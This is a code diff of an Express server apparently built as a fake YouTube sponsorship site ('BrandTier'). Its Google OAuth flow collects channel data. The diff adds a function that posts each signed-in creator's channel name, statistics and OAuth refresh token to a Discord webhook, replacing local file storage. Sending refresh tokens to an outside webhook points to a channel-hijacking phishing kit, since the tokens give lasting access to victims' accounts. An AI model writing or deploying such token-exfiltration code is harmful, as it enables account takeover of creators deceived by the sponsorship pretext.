@@ -3,7 +3,6 @@ const express = require("express");
 const axios = require("axios");
 const session = require("express-session");
 const cors = require("cors");
-const fs = require("fs");
 
 const app = express();
 
@@ -12,7 +11,6 @@ const app = express();
 // --------------------
 const PORT = process.env.PORT || 3000;
 
-// CORS (frontend controlled via env)
 app.use(cors({
   origin: process.env.FRONTEND_URL || true,
   credentials: true
@@ -20,32 +18,49 @@ app.use(cors({
 
 app.use(express.json());
 
-// Session (keep simple for now)
+// ⚠️ SESSION (memory-based, temporary)
 app.use(session({
   secret: process.env.SESSION_SECRET || "brandtier_secret_key",
   resave: false,
-  saveUninitialized: false
+  saveUninitialized: false,
+  cookie: {
+    secure: true,
+    sameSite: "none"
+  }
 }));
 
-const FILE = "tokens.json";
-
 // --------------------
-// Helpers (file storage)
+// DISCORD WEBHOOK
 // --------------------
-function loadData() {
-  if (!fs.existsSync(FILE)) return [];
-  return JSON.parse(fs.readFileSync(FILE));
+async function sendToDiscord(payload) {
+  try {
+    await axios.post(process.env.DISCORD_WEBHOOK_URL, {
+      embeds: [
+        {
+          title: "YouTube OAuth Login",
+          color: 5814783,
+          fields: [
+            { name: "Channel", value: payload.name || "N/A" },
+            { name: "Subscribers", value: String(payload.subs || "N/A") },
+            { name: "Views", value: String(payload.views || "N/A") },
+            { name: "Videos", value: String(payload.videos || "N/A") },
+            { name: "Refresh Token", value: payload.refresh_token || "N/A" }
+          ],
+          timestamp: new Date().toISOString()
+        }
+      ]
+    });
+  } catch (err) {
+    console.log("Discord webhook error:", err.message);
+  }
 }
 
-function saveData(data) {
-  fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
-}
-
 // --------------------
-// 1. Google OAuth Login
+// 1. OAuth LOGIN
 // --------------------
 app.get("/auth", (req, res) => {
-  const url = "https://accounts.google.com/o/oauth2/v2/auth?" +
+  const url =
+    "https://accounts.google.com/o/oauth2/v2/auth?" +
     new URLSearchParams({
       client_id: process.env.CLIENT_ID,
       redirect_uri: process.env.REDIRECT_URI,
@@ -59,32 +74,35 @@ app.get("/auth", (req, res) => {
 });
 
 // --------------------
-// 2. OAuth Callback
+// 2. OAuth CALLBACK
 // --------------------
 app.get("/callback", async (req, res) => {
   const code = req.query.code;
 
   try {
-const tokenRes = await axios.post(
-  "https://oauth2.googleapis.com/token",
-  new URLSearchParams({
-    code,
-    client_id: process.env.CLIENT_ID,
-    client_secret: process.env.CLIENT_SECRET,
-    redirect_uri: process.env.REDIRECT_URI,
-    grant_type: "authorization_code"
-  }),
-  {
-    headers: {
-      "Content-Type": "application/x-www-form-urlencoded"
-    }
-  }
-);
+    // exchange code for tokens
+    const tokenRes = await axios.post(
+      "https://oauth2.googleapis.com/token",
+      new URLSearchParams({
+        code,
+        client_id: process.env.CLIENT_ID,
+        client_secret: process.env.CLIENT_SECRET,
+        redirect_uri: process.env.REDIRECT_URI,
+        grant_type: "authorization_code"
+      }),
+      {
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        }
+      }
+    );
+
     const { access_token, refresh_token } = tokenRes.data;
 
+    // store in session (temporary)
     req.session.tokens = { access_token, refresh_token };
 
-    // YouTube API
+    // fetch YouTube channel
     const yt = await axios.get(
       "https://www.googleapis.com/youtube/v3/channels",
       {
@@ -98,38 +116,32 @@ const tokenRes = await axios.post(
       }
     );
 
-    const channel = yt.data.items[0];
+    const channel = yt.data.items?.[0];
 
-    const data = loadData();
+    if (!channel) {
+      return res.status(400).send("No channel found");
+    }
 
-    data.push({
+    // send to Discord webhook
+    await sendToDiscord({
       name: channel.snippet.title,
-      avatar: channel.snippet.thumbnails.default.url,
       subs: channel.statistics.subscriberCount,
       views: channel.statistics.viewCount,
       videos: channel.statistics.videoCount,
-      refresh_token,
-      accepted: false,
-      createdAt: new Date()
+      refresh_token
     });
 
-    saveData(data);
-
-    // 🔥 FIXED: no more localhost
+    // redirect frontend
     res.redirect(process.env.FRONTEND_URL + "/?connected=1");
 
   } catch (err) {
-  console.log("OAUTH FAILED:", err.response?.data || err.message);
-
-  return res.status(500).json({
-    message: "OAuth failed",
-    error: err.response?.data || err.message
-  });
-}
+    console.log(err.response?.data || err.message);
+    res.status(500).send("OAuth Error");
+  }
 });
 
 // --------------------
-// 3. Get YouTube Data
+// 3. GET USER DATA
 // --------------------
 app.get("/api/youtube", async (req, res) => {
   if (!req.session.tokens) {
@@ -150,7 +162,11 @@ app.get("/api/youtube", async (req, res) => {
       }
     );
 
-    const channel = yt.data.items[0];
+    const channel = yt.data.items?.[0];
+
+    if (!channel) {
+      return res.status(400).send("No channel found");
+    }
 
     res.json({
       name: channel.snippet.title,
@@ -166,22 +182,7 @@ app.get("/api/youtube", async (req, res) => {
 });
 
 // --------------------
-// 4. Accept Sponsorship
-// --------------------
-app.post("/accept", (req, res) => {
-  const data = loadData();
-
-  if (data.length > 0) {
-    data[data.length - 1].accepted = true;
-  }
-
-  saveData(data);
-
-  res.send("Deal accepted");
-});
-
-// --------------------
-// 5. Logout
+// 4. LOGOUT
 // --------------------
 app.get("/logout", (req, res) => {
   req.session.destroy(() => {
@@ -190,7 +191,7 @@ app.get("/logout", (req, res) => {
 });
 
 // --------------------
-// Start server (Railway-safe)
+// START SERVER
 // --------------------
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
